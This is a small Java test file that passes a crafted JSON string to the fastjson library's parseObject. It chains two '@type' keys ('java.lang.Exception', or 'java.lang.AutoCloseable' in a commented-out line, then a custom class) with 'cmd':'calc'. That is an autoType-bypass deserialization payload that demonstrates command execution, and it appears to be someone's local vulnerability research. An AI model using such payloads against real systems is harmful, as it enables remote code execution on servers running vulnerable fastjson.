package com.mechoy;

import com.alibaba.fastjson.JSON;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/5/7
 * Description
 */
public class fastjsonTest1 {
    public static void main(String[] args) {
//        String s = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mechoy.Test\",\"cmd\":\"calc\"}";
        String s1 = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.mechoy.Test2\",\"cmd\":\"calc\"}";
        JSON.parseObject(s1);
    }
}
